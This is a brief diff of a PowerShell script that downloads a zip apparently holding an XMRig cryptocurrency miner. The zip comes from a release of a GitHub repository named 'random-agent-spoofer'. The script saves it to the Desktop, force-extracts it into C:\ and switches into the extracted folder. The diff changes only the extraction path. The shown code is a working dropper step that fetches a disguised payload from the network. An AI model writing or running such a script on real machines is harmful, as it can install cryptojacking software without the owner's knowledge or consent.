@@ -1,8 +1,7 @@
 $downloadPath = Join-Path -Path $env:USERPROFILE -ChildPath "Desktop"
 $url = "https://github.com/trangtrau/random-agent-spoofer/releases/download/SA/CSANGXMRIG.zip"
 Invoke-WebRequest -Uri $url -OutFile "$downloadPath\CSANGXMRIG.zip"
-
-$destinationPath = "C:\CSANGXMRIG" 
+$destinationPath = "C:\" 
 Expand-Archive -Path "$downloadPath\CSANGXMRIG.zip" -DestinationPath $destinationPath -Force
 Start-Sleep -Seconds 2
 Set-Location -Path "C:\CSANGXMRIG\"
